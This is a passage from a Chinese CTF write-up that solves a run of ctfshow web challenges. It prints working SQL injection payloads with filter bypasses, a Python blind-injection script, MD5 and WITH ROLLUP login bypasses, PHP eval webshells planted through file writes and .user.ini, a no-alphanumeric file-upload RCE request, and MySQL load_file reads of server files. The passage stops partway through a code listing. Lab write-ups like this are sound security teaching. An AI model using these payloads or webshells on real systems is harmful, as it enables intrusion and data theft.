爆破数据库\n?id=1/**/union/**/select/**/1,database(),3#数据库名为web7\n爆破数据库表名\n?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=“web7”),3#出现flag,page,user三个表\n(其实这里的话我一开始不知道是过滤了单引号，我原来的语句是?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=‘web7’),3#然后发现并没有回显，所以才发现是过滤了单引号)\n爆破表中字段\n?id=1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\"flag\"),3#出现flag字段\n爆破数据\n?id=1/**/union/**/select/**/1,(select/**/flag/**/from/**/web7.flag),3#\n```\n\n## web8\n\n### #布尔盲注+过滤逗号\n\n做到这一题，基本可以写简单的注入工具了\n\n还是一样的页面，我们先fuzz一下\n\n![image-20250308204915981](../image/achieve/202411/ctfshow--web专题/image-20250308204915981.png)\n\nunion等字符被过滤了，尝试盲注\n\n因为这里的逗号被过滤了，所以我们的盲注语句要稍微改一下\n\n```\n这是原来的语句\n-1 or ascii(substr((select database()),1,1))='xx'%23\n修改后\n-1 or ascii(substr((select database())from 1 for 1))='xx'%23\n```\n\n### 绕过逗号\n\n#### from for\n\n盲注的时候为了截取字符串，我们往往会使用substr(),mid()。这些子句方法都需要使用到逗号，对于substr()和mid()这两个方法可以使用from for的方式来解决：\n\n```plain\nselect substr(database() from 1 for 1);\nselect mid(database() from 1 for 1);\n```\n\n等价于mid/substr(database(),1,1)\n\n前面的爆数据库就是不说了，把盲注的payload改一下就行了\n\n### 布尔盲注脚本\n\n```python\nimport requests\n\n#爆破数据库长度\ndef database_length(url, headers):\n    databaselen = 0\n    for i in range(1, 100):\n        databaselen_payload = f'?id=-1/**/or/**/length(database())={i}#'\n        response = requests.get(url + databaselen_payload, headers=headers)\n        if \"I asked nothing\" in response.text:\n            databaselen = i\n            break\n    print('数据库长度为:  '+ str(databaselen))\n    return databaselen\n\n#爆破数据库名\ndef database_name(url, headers,databaselen):\n    database_name = ''\n    for i in range(0,databaselen):\n        for j in range(32,128):\n            database_name_payload = f'?id=-1/**/or/**/ascii(substr((select/**/database())from/**/{i+0}/**/for/**/1))=\"{j}\"#'\n            response = requests.get(url + database_name_payload, headers=headers)\n            if \"I asked nothing\" in response.text:\n                database_name += chr(j)\n                print(database_name)\n                break\n    print('数据库名为:  '+ str(database_name))\n    return database_name\n\n#爆破表名\ndef table_name(url, headers,databasename):\n    table_name = ''\n    for i in range(0,100):\n        for j in range(32,128):\n            table_name_payload = f'?id=-1/**/or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=\"{databasename}\")from/**/{i+0}/**/for/**/1))=\"{j}\"#'\n            response = requests.get(url + table_name_payload, headers=headers)\n            if \"I asked nothing\" in response.text:\n                table_name += chr(j)\n                print(table_name)\n                break\n    print('表名为:  '+ str(table_name))\n    return table_name\n    \n#爆破字段名\ndef column_name(url, headers,table_name):\n    column_name = ''\n    for i in range(0,100):\n        for j in range(32,128):\n            column_name_payload = f'?id=-1/**/or/**/ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=\"{table_name}\")from/**/{i+0}/**/for/**/1))=\"{j}\"#'\n            response = requests.get(url + column_name_payload, headers=headers)\n            if \"I asked nothing\" in response.text:\n                column_name += chr(j)\n                print(column_name)\n                break\n    print('字段名为:  '+ str(column_name))\n    return column_name\n#爆破数据\ndef table_data(url, headers):\n    data = ''\n    for i in range(0,100):\n        for j in range(32,128):\n            payload =f'?id=-1/**/or/**/ascii(substr((select/**/flag/**/from/**/web8.flag)from/**/{i+0}/**/for/**/1))=\"{j}\"#'\n            response = requests.get(url + payload, headers=headers)\n            if \"I asked nothing\" in response.text:\n                data += chr(j)\n                print(data)\n                break\n    print('flag为:  '+ str(data))\n    return data\nif __name__ == '__main__':\n    url = \"http://ca996ae0-234f-4906-a89e-eb287b82f1e9.challenge.ctf.show/index.php\"\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'\n    }\n    databaselength = database_length(url, headers)\n    databasename = database_name(url, headers,databaselength)\n    tablename = table_name(url, headers,databasename)\n    columnname = column_name(url, headers,tablename)\n    table_datas=table_data(url,headers)\n```\n\n## web9\n\n### #MD5的sql\n\n![image-20241205173413611](./../image/achieve/202411/ctfshow--web专题/image-20241205173413611.png)\n\n很经典的登录界面，我以为是sql注入，但是后面测试发现打不通\n\n![image-20241205173512199](./../image/achieve/202411/ctfshow--web专题/image-20241205173512199.png)\n\n包告诉我看到php可以扫一下目录，那我拿dirsearch扫一下目录\n\n![image-20241205175046006](./../image/achieve/202411/ctfshow--web专题/image-20241205175046006.png)\n\n发现了一个robots.txt,访问后有一个文件\n\n![image-20241205175208348](./../image/achieve/202411/ctfshow--web专题/image-20241205175208348.png)\n\n下载下来\n\n```php\n<?php\n        $flag=\"\";\n\t\t$password=$_POST['password'];\n\t\tif(strlen($password)>10){#检查密码的长度是否大于10个字符\n\t\t\tdie(\"password error\");\n\t\t}\n\t\t$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";\n\t\t$result=mysqli_query($con,$sql);\n\t\t\tif(mysqli_num_rows($result)>0){\n\t\t\t\t\twhile($row=mysqli_fetch_assoc($result)){\n\t\t\t\t\t\t echo \"登陆成功<br>\";\n\t\t\t\t\t\t echo $flag;\n\t\t\t\t\t }\n\t\t\t}\n    ?>\n```\n\n这个是md5加密漏洞\n\n### MD5 SQL绕过漏洞\n\n#### md5(string,raw)函数\n\n在 PHP 中，`md5()` 函数可以接受两个参数。第一个参数是要计算散列值的字符串，而第二个参数是一个布尔值，用于指定是否返回原始二进制格式的散列值。\n\n- 当第二个参数设置为 `false` 或者不提供时，`md5()` 函数将返回一个32位的十六进制散列值（即字符串形式的散列值）。\n- 当第二个参数设置为 `true` 时，`md5()` 函数将返回一个16字节（128位）的二进制格式的散列值。这个二进制格式的散列值不是以文本形式表示的，而是以字节的形式表示。\n\nmd5看似是非常强加密措施，但是一旦没有返回我们常见的16进制数，返回了二进制原始输出格式，在浏览器编码的作用下就会编码成为奇怪的字符串（对于二进制一般都会编码）。\n\n我们使用md5碰撞，一旦在这些奇怪的字符串中碰撞出了可以进行SQL注入的特殊字符串，那么就可以越过登录了。\n\n在经过长时间的碰撞后，比较常用的是以下两种：\n数字型：`129581926211651571912466741651878684928`\n字符型：`ffifdyop`\n\n我们验证一下\n\n```php\n<?php\n    $a='ffifdyop';\n    $b='129581926211651571912466741651878684928';\n    $bb=md5($a,TRUE);\n    echo $bb;\n    echo \"\\n\";\n    $cc=md5($b,true);\n    echo $cc\n    ?>\n```\n\n![image-20241205180453136](./../image/achieve/202411/ctfshow--web专题/image-20241205180453136.png)\n\n可以看到这里有or语句\n\n```\nffifdyop 的MD5加密结果是 276f722736c95d99e921722cf9ed621c\n\n经过MySQL编码后会变成'or'6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密\n```\n\n就可以构造出必真的结果。\n\n因为这里限制了长度，所以我们用ffifdyop\n\n![image-20241205180831759](./../image/achieve/202411/ctfshow--web专题/image-20241205180831759.png)\n\n直接传进去就可以了\n\n## web10\n\n### #虚拟表构造绕过\n\n![image-20241205182654245](./../image/achieve/202411/ctfshow--web专题/image-20241205182654245.png)\n\n看到是php还是先扫一下目录\n\n![image-20241205183351916](./../image/achieve/202411/ctfshow--web专题/image-20241205183351916-1733394833778-6.png)\n\n没什么可用的信息\n\n然后我们可以看到在页面中有一个取消的按钮，按了之后会下载一个index.phps\n\n```php\n<?php\n\t\t$flag=\"\";\n        function replaceSpecialChar($strParam){\n             $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";\n             return preg_replace($regex,\"\",$strParam);\n        }#定义一个函数用来检查传入的参数\n        if (!$con)\n        {\n            die('Could not connect: ' . mysqli_error());\n        }#检查数据库连接情况，这里对做题没用可以忽略\n\t\tif(strlen($username)!=strlen(replaceSpecialChar($username))){\n\t\t\tdie(\"sql inject error\");\n\t\t}#需要我们输入的username和经过检测函数后的username的长度一样\n\t\tif(strlen($password)!=strlen(replaceSpecialChar($password))){\n\t\t\tdie(\"sql inject error\");\n\t\t}#password也是一样\n\t\t$sql=\"select * from user where username = '$username'\";\n\t\t$result=mysqli_query($con,$sql);#使用 mysqli_query()函数执行之前构建的 SQL 查询。\n\t\t\tif(mysqli_num_rows($result)>0){#如果查询的结果大于0\n                #使用 mysqli_fetch_assoc() 函数遍历结果集合，将每一行数据作为关联数组 ($row) 获取。\n\t\t\t\t\twhile($row=mysqli_fetch_assoc($result)){\n\t\t\t\t\t\tif($password==$row['password']){\n                            #检查输入的 $password 是否与数据库中检索到的用户的 password 字段相匹配。\n\t\t\t\t\t\t\techo \"登陆成功<br>\";\n\t\t\t\t\t\t\techo $flag;\n\t\t\t\t\t\t}\n\t\t\t\t\t }\n\t\t\t}\n    ?>\n```\n\n应该是正常的sql注入+绕过，那我们还是先来解析一下这段代码(我直接把注释放在代码中了)\n\n### mysqli_query()函数\n\n`mysqli_query()` 是 PHP 中用于执行 MySQL 查询的函数。\n\n### mysqli_num_rows()函数\n\n`mysqli_num_rows()` 是 PHP 中用于获取 MySQLi 结果集中行数的函数。这个函数通常用于在执行 SELECT 查询后确定返回的结果集中有多少行。它适用于使用 `mysqli_query()` 函数执行的查询。\n\n### \\s符号\n\n\\s\"在正则表达式中代表匹配空白字符的元字符。空白字符包括空格、制表符、换行符等，用\\s来表示，可以匹配任意空白字符。\n\n思路:\n\n我们发现很多关键字` $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";`都被过滤掉了，那么常规注入就不可行了，而且账户密码都进行了过滤，代码里面输出flag的要求是我们输入的password和数据库中的password是一样的，但是我们啥也不知道，那么怎么办呢？\n\n### 构建虚拟表with rollup绕过\n\npayload:\n\n```\nusername:admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#\npassword:\n```\n\nwith rollup:  mysql中的with rollup是用来在分组统计数据的基础上再进行统计汇总，用来得到group by的汇总信息。要配合 group by 一块儿使用，”group by password with rollup”,简单说一下，就是使用with rollup 查询以后，查询结果集合里面会多一条NULL 记录，这一题利用NULL 和空字符相等，而后获得flag。我们就是要通过with rollup使sql语句查询结果为null，然后不输入pwd使pwd为null就可以使$password==$row['password'],通过验证输出我们的flag\n\n## web11\n\n### #session伪造\n\n![image-20241212184937818](./../image/achieve/202411/ctfshow--web专题/image-20241212184937818.png)\n\n看到源码泄露了\n\n```php\n<?php\n        function replaceSpecialChar($strParam){\n             $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";\n             return preg_replace($regex,\"\",$strParam);\n        }\n        if(strlen($password)!=strlen(replaceSpecialChar($password))){\n            die(\"sql inject error\");\n        }\n        if($password==$_SESSION['password']){\n            echo $flag;\n        }else{\n            echo \"error\";\n        }\n    ?>\n```\n\n有了上一题的学习，这道题的话我们发现这道题的条件明显比上一题要简单很多\n\n因为我们要让password过滤前后的长度相等，并且要等于session中的password值，所以我们抓个包，然后我们输入应该password的值并且修改session中password的值是一样的就行\n\n这里我们把phpsession的值给为空，然后把密码也改成空就行\n\n![image-20241212185958532](./../image/achieve/202411/ctfshow--web专题/image-20241212185958532.png)\n\n## web12\n\n### #绕过disable_function\n\n![image-20250308212434968](../image/achieve/202411/ctfshow--web专题/image-20250308212434968.png)\n\n在页面源码中发现一个注释中提到参数cmd\n\nget传入cmd为phpinfo();就可以出现php的配置信息，但是传入system函数没回显，传?cmd=eval($_GET[1]);&1=phpinfo();但是对1传system依旧没回显，可能是权限不够，在phpinfo里面看一下disable_functions\n\n![image-20250308213719548](../image/achieve/202411/ctfshow--web专题/image-20250308213719548.png)\n\n可以看到system等执行命令的函数都被禁用了，试一下能不能连上蚁剑去绕过disable_functions\n\n测一下能不能写入文件\n\n![image-20250308214036299](../image/achieve/202411/ctfshow--web专题/image-20250308214036299.png)\n\n然后访问1.txt看到显示123，说明可以写，并且目录就是当前目录\n\npayload\n\n```\nfile_put_contents(%271.php%27,%27<?php eval($_POST[1]);?>%27);\n```\n\n访问1.php并用蚁剑去连马，绕过disable_functions就可以了\n\n![image-20250308214729871](../image/achieve/202411/ctfshow--web专题/image-20250308214729871.png)\n\n## 红包题第二弹\n\n### #无数字字母RCE\n\n和上一题一样的页面，随便对cmd传入一个值就出源码了\n\n```php\n    <?php\n        if(isset($_GET['cmd'])){\n            $cmd=$_GET['cmd'];\n            highlight_file(__FILE__);\n            if(preg_match(\"/[A-Za-oq-z0-9$]+/\",$cmd)){\n            \n                die(\"cerror\");\n            }\n            if(preg_match(\"/\\~|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\'|\\\"|\\:|\\,/\",$cmd)){\n                die(\"serror\");\n            }\n            eval($cmd);\n        \n        }\n    \n     ?>\n```\n\n先用脚本输出可用字符\n\n```php\n#输出可用字符\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/[A-Za-oq-z0-9$]+|\\~|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\'|\\\"|\\:|\\,/\",chr($i))){\n            echo chr($i).\" \";\n        }\n} \n?>\n#+ . / ; < = > ? \\ ` p | \n```\n\n很简单，就是无数字字母里的临时文件上传rce\n\n请求包\n\n```\nPOST /?cmd=?><?=`.+/???/p?p??????`; HTTP/1.1\nHost: 61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show\nContent-Length: 296\nCache-Control: max-age=0\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n------WebKitFormBoundaryiKHEKB03McUcMv6w\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: text/plain\n\n#! /bin/sh\nwhoami\n------WebKitFormBoundaryiKHEKB03McUcMv6w\nContent-Disposition: form-data; name=\"submit\"\n\n提交\n------WebKitFormBoundaryiKHEKB03McUcMv6w--\n\n```\n\n这里如果是全部问号的话感觉匹配不上我们上传的文件，刚好漏了个字母p，应该就是这里用的\n\n接着改文件内容进行rce就行\n\n```\nPOST /?cmd=?><?=`.+/???/p?p??????`; HTTP/1.1\nHost: 61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show\nContent-Length: 303\nCache-Control: max-age=0\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n------WebKitFormBoundaryiKHEKB03McUcMv6w\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: text/plain\n\n#! /bin/sh\ncat /flag.txt\n------WebKitFormBoundaryiKHEKB03McUcMv6w\nContent-Disposition: form-data; name=\"submit\"\n\n提交\n------WebKitFormBoundaryiKHEKB03McUcMv6w--\n\n```\n\n## web13\n\n### #.user.ini文件上传\n\n![image-20250308221344911](../image/achieve/202411/ctfshow--web专题/image-20250308221344911.png)\n\n传了一个一句话木马显示大小错误，扫目录看到一个/upload.php\n\n![image-20250308221515074](../image/achieve/202411/ctfshow--web专题/image-20250308221515074.png)\n\n访问也没啥，后面看wp才知道这里有备份文件源码泄露，可能是题目做少了 没这种思路\n\n访问upload.php.bak下载源码\n\n```php\n<?php \n\theader(\"content-type:text/html;charset=utf-8\");\n\t$filename = $_FILES['file']['name'];\n\t$temp_name = $_FILES['file']['tmp_name'];\n\t$size = $_FILES['file']['size'];\n\t$error = $_FILES['file']['error'];\n\t$arr = pathinfo($filename);\n\t$ext_suffix = $arr['extension'];\n\tif ($size > 24){\n\t\tdie(\"error file zise\");\n\t}\n\tif (strlen($filename)>9){\n\t\tdie(\"error file name\");\n\t}\n\tif(strlen($ext_suffix)>3){\n\t\tdie(\"error suffix\");\n\t}\n\tif(preg_match(\"/php/i\",$ext_suffix)){\n\t\tdie(\"error suffix\");\n    }\n    if(preg_match(\"/php/i\"),$filename)){\n        die(\"error file name\");\n    }\n\tif (move_uploaded_file($temp_name, './'.$filename)){\n\t\techo \"文件上传成功！\";\n\t}else{\n\t\techo \"文件上传失败！\";\n\t}\n ?>\n```\n\n正则匹配\n\n- 文件的大小 > 24（error file zise）\n- 文件名的长度 > 9（error file name）\n- 后缀名的长度 > 3（error suffix）\n- 后缀名包含 php（error suffix）\n- 文件名包含 php（error file name）\n\n我们肯定是要上传一句话木马的，既然小于等于24可以这样写`<?php eval($_POST['a']);`正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句。\n\n一个新的知识点，利用.user.ini去包含我们的一句话木马\n\n![image-20250308231722174](../image/achieve/202411/ctfshow--web专题/image-20250308231722174.png)\n\n我们要上传一个.user.ini文件，.user.ini 是 PHP 的用户级配置文件。这个文件允许用户在特定目录中自定义一些 PHP 配置选项，以覆盖全局 PHP 配置。\n\nPHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。\n\n我们在.user.ini中输入`auto_prepend_file =a.txt`，这样在该目录下的所有文件都会包含a.txt的内容\n\n```\n.user.ini的内容\nauto_prepend_file=a.txt\n```\n\n然后编辑a.txt写一句话木马就行，这里要记得文件的内容大小问题\n\n```php\n<?php eval($_POST['a']);\n```\n\n然后在当前路径下进行post传参，应该是权限的问题，连马后操作不了\n\n使用函数套用去看一下当前目录的文件\n\n![image-20250308231126489](../image/achieve/202411/ctfshow--web专题/image-20250308231126489.png)\n\n再用highlight_file去读文件就行\n\n## web14\n\n### #无列名注入+mysql读取文件\n\n```php\n<?php\ninclude(\"secret.php\");\n\nif(isset($_GET['c'])){\n    $c = intval($_GET['c']);\n    sleep($c);\n    switch ($c) {\n        case 1:\n            echo '$url';\n            break;\n        case 2:\n            echo '@A@';\n            break;\n        case 555555:\n            echo $url;\n        case 44444:\n            echo \"@A@\";\n            break;\n        case 3333:\n            echo $url;\n            break;\n        case 222:\n            echo '@A@';\n            break;\n        case 222:\n            echo '@A@';\n            break;\n        case 3333:\n            echo $url;\n            break;\n        case 44444:\n            echo '@A@';\n        case 555555:\n            echo $url;\n            break;\n        case 3:\n            echo '@A@';\n        case 6000000:\n            echo \"$url\";\n        case 1:\n            echo '@A@';\n            break;\n    }\n}\n\nhighlight_file(__FILE__);\n```\n\n在代码中可以看到传入3的话由于case3后面没有break，所以他会继续往下执行，然后就会回显出$url参数的值，但是这里是带引号的，意思是不会返回url的内容\n\n对于php，单引号包裹的内容只能当做纯字符串, 而双引号包裹的内容, 可以识别变量, 所以源码中的 \"$url\" 可以当做 $url 变量被正常执行\n\n传入3后返回url的值是here_1s_your_f1ag.php，访问这个文件出现一个查询页面\n\n![image-20250310151921904](../image/achieve/202411/ctfshow--web专题/image-20250310151921904.png)\n\n用单引号闭合就看到弹窗没内容了，应该是存在sql注入的，后面测出来如果输入非法字符的话就没得弹窗，如果语句成功执行就会返回admin弹窗\n\n可以先fuzz一下\n\n在返回包中看到一个正则匹配\n\n```php\n\tif(preg_match('/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is', $_GET['query'])){\n\t\tdie('@A@');\n\t}\n```\n\ninformation_schema库被禁了，看看能不能打无列名注入\n\n看一下语句错误和语句正确的回显\n\n![image-20250310152821259](../image/achieve/202411/极客大挑战2020/image-20250310152821259.png)\n\n这是语句错误的时候的回显\n\n![image-20250310153039724](../image/achieve/202411/ctfshow--web专题/image-20250310153039724.png)\n\n语句正确的回显\n\n同时过滤了空格\n\n传入`1/**/or/**/true`回显admin弹窗，用`/**/`可以绕过空格\n\n所以这里的话应该是要打无列名注入\n\n先测一下字段数\n\n```\n1/**/order/**/by/**/1---------传入2报错，字段数为1\n-1/**/union/**/select/**/1---------回显1(注意这里要填-1才会返回1的结果，不然返回位置会被1的查询结果占据)\n-1/**/union/**/select/**/database()-----回显web,当前数据库为web\n-1/**/union/**/select/**/(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats/**/where/**/database_name='web')---------回显content表名，这里使用了innodb_table_stats获取表名\n利用union别名查询每列的数据\n-1/**/union/**/select/**/(select/**/group_concat(`1`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------1,1,2,3\n-1/**/union/**/select/**/(select/**/group_concat(`2`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------2,admin,gtf1y,Wow\n-1/**/union/**/select/**/(select/**/group_concat(`3`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a)---3,flag is not here!,wow,you can really dance,tell you a secret,secret has a secret...\n```\n\nFlag 不在数据库中，可能还得mysql读取敏感文件\n\n```\n先看一下数据库用户名是什么\n-1/**/union/**/select/**/user()------root@localhost\n意味着我们可以用root用户高权限使用MySQL进行命令执行\n-1/**/union/**/select/**/load_file(\"/etc/nginx/nginx.conf\")------通过root /var/www/html;：知道了网页根目录\n-1/**/union/**/select/**/load_file(\"/var/www/html/secret.php\")----结合一开始题目的include代码，试着读取目录下的secret.php文件\n```\n\n读取后返回一段代码\n\n```\n<!-- ReadMe -->\n<?php\n$url = 'here_1s_your_f1ag.php';\n$file = '/tmp/gtf1y';\nif(trim(@file_get_contents($file)) === 'ctf.show'){\n\techo file_get_contents('/real_flag_is_here');\n}\n```\n\n直接读取目录下的real_flag_is_here\n\n## 红包题第六弹\n\n### #强碰撞+文件竞争\n\n1.不是SQL注入 2.需要找关键源码\n\n![image-20250310173523034](../image/achieve/202411/ctfshow--web专题/image-20250310173523034.png)\n\n随便传入字符显示md5 error，一开始猜测是对用户名或者对密码的md5加密，尝试闭合括号后发现无果，只能另寻出路\n\n用dirsearch扫目录后找到一个web.zip文件\n\n![image-20250310192755074](../image/achieve/202411/ctfshow--web专题/image-20250310192755074.png)\n\n访问后下载压缩包，拿到check.php的源码\n\n```php\nfunction receiveStreamFile($receiveFile){\n \n    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';\n \n    if(empty($streamData)){\n        $streamData = file_get_contents('php://input');\n    }\n \n    if($streamData!=''){\n        $ret = file_put_contents($receiveFile, $streamData, true);\n    }else{\n        $ret = false;\n    }\n \n    return $ret;\n \n}\nif(md5(date(\"i\")) === $token){//时间分钟数的MD5加密是否为$token值\n\t\n\t$receiveFile = 'flag.dat';\n\treceiveStreamFile($receiveFile);//接收数据流并写入flag.dat文件\n\tif(md5_file($receiveFile)===md5_file(\"key.dat\")){//判断两文件的MD5值是否相等\n\t\tif(hash_file(\"sha512\",$receiveFile)!=hash_file(\"sha512\",\"key.dat\")){\n            //如果两个文件的sha512值不相等\n\t\t\t$ret['success']=\"1\";\n\t\t\t$ret['msg']=\"人脸识别成功!$flag\";\n\t\t\t$ret['error']=\"0\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n\t\t}\n\n\t\t\t$ret['errormsg']=\"same file\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n\t}\n\t\t\t$ret['errormsg']=\"md5 error\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n} \n\n$ret['errormsg']=\"token error\";\necho json_encode($ret);\nreturn;\n```\n\n- 定义了一个名为 `receiveStreamFile` 的函数，主要功能是接收流数据并将其写入指定的文件中。\n- `$GLOBALS['HTTP_RAW_POST_DATA']` 是 PHP 中的一个全局变量，用于获取 HTTP POST 请求中的原始数据。\n- `date(\"i\")` 中的参数 \"i\" 代表获取时间的分钟部分。\n\n这里的话有条件就是需要让两个文件的md5值相等但是sha512值不相等\n\n![image-20250310200920613](../image/achieve/202411/ctfshow--web专题/image-20250310200920613.png)\n\n在源码中看到一行代码\n\n```\noReq.open(\"POST\", \"check.php?token=\"+token+\"&php://input\", true);\n```\n\n 对当前日期做了一个MD5的编码,可以发现是需要用php://input获取文件流，然后返回一个文件\n\n需要自己传上去的文件与已存在的key.dat MD5要一致，sha512不一致，但是首先的就是我们需要获取到这个key.dat，后来发现直接访问就下载下来了\n\n但是这里是需要条件竞争的，因为token值是会变化的\n\n直接贴脚本\n\n```python\nimport requests  # 导入 requests 库，用于发送 HTTP 请求\nimport time  # 导入 time 模块，用于获取本地时间\nimport hashlib  # 导入 hashlib 模块，用于进行哈希加密\nimport threading  # 导入 threading 模块，用于多线程操作\n\n# 生成一个代表当前分钟数的字符串，并存储在变量 i 中\ni=str(time.localtime().tm_min)\n# 使用 MD5 算法对分钟数进行哈希加密，生成 token，并存储在变量 m 中\nm=hashlib.md5(i.encode()).hexdigest()\n# 构造请求的 URL，其中 token 的数值由生成的 m 变量决定\nurl=\"http://335e5b97-20c5-455c-a7ad-808a2cdba8d8.challenge.ctf.show/check.php?token={}&php://input\".format(m)\n\n# 定义一个将数据以 POST 请求发送的函数 POST\ndef POST(data):\n    try:\n        r=requests.post(url,data=data)  # 发送 POST 请求到指定的 URL，并传递 data 数据\n        if \"ctfshow\" in r.text:  # 如果响应文本中包含 \"ctfshow\"\n            print(r.text)  # 打印响应文本\n            pass\n        pass\n    except Exception as e:\n        print(\"somthing went wrong!\")  # 捕获异常，并打印错误信息\n        pass\n    pass\n\n# 读取名为 'key.dat' 的文件内容，并存储在 data1 变量中\nwith open('key.dat','rb') as t:\n    data1=t.read()\n    pass\n\n# 开启 50 个线程，每个线程发送一个 POST 请求，传递 data1 数据\nfor i in range(50):\n    threading.Thread(target=POST,args=(data1,)).start()\n\n# 开启 50 个线程，每个线程发送一个 POST 请求，传递 'emmmmm' 字符串数据\nfor i in range(50):\n    data2='emmmmm'\n    threading.Thread(target=POST,args=(data2,)).start()\n\n```\n\n把地址换一下就可以跑出来了，这里需要把key.dat文件放在python目录中\n\n![image-20250310202633671](../image/achieve/202411/ctfshow--web专题/image-20250310202633671-1741609595157-43.png)\n\n## 红包题第七弹\n\n### #.git文件泄露+绕过disable_function\n\n开出来就是php配置信息\n\n![image-20250310203218395](../image/achieve/202411/ctfshow--web专题/image-20250310203218395-1741609939898-46.png)\n\n先看看这里有啥吧，顺便扫一下目录，发现有.git文件\n\n![image-20250310204336031](../image/achieve/202411/ctfshow--web专题/image-20250310204336031.png)\n\n用GitHack去获取.git文件\n\n![image-20250310204707338](../image/achieve/202411/ctfshow--web专题/image-20250310204707338.png)\n\n有两份文件\n\n```php\n//index.php\n<?php phpinfo();?>\n```\n\n```php\n//backdoor.php\n<!-- 36D姑娘留的后门，闲人免进 -->\n<?php \n\t@eval($_POST['Letmein']);\n?>\n```\n\n有后门文件，路径就是当前目录下的/backdoor.php，访问后用蚁剑链接然后绕过disable_function\n\n![image-20250310210111779](../image/achieve/202411/ctfshow--web专题/image-20250310210111779.png)\n\n一开始以为flag是在根目录的，然后去那里看了半天，结果发现是假的flag\n\n## 萌新专属红包题\n\n### #弱口令爆破\n\n![image-20250310210855502](../image/achieve/202411/ctfshow--web专题/image-20250310210855502.png)\n\n扫了一下目录，发现了一个main文件\n\n![image-20250310212922119](../image/achieve/202411/ctfshow--web专题/image-20250310212922119.png)\n\n但是访问了啥都没有，继续回到登录界面看看，尝试弱口令爆破\n\n试一下admin/adminxxxx的弱口令尝试\n\n![image-20250310213510712](../image/achieve/202411/ctfshow--web专题/image-20250310213510712.png)\n\n![image-20250310213614397](../image/achieve/202411/ctfshow--web专题/image-20250310213614397.png)\n\n直接爆出来了\n\nadmin/admin888\n\n在返回包看到有flag加密字符\n\n![image-20250310213802382](../image/achieve/202411/极客大挑战2020/image-20250310213802382.png)\n\n加密出来就是flag了\n\n## CTFshow web1\n\n### #布尔盲注\n\nflag在指定用户的密码中。\n\n一个登录界面，注册后登录\n\n![image-20250310213949344](../image/achieve/202411/ctfshow--web专题/image-20250310213949344.png)\n\n应该是需要找到这个flag用户的密码\n\n但是在登录的时候抓包发现密码都会变成一段长字符\n\n![image-20250310214258441](../image/achieve/202411/ctfshow--web专题/image-20250310214258441.png)\n\n常规扫目录看到有www.zip文件，下载下来\n\n```php\n//login.php\n<?php\n\t\terror_reporting(0);\n\t\tsession_start();\n\t\t$con = mysqli_connect(\"localhost\",\"root\",\"root\",\"web15\");\n        if (!$con)\n        {\n            die('Could not connect: ' . mysqli_error());\n        }\n\t\t$username=$_POST['username'];\n\t\t$password=$_POST['password'];\n\t\tif(isset($username) && 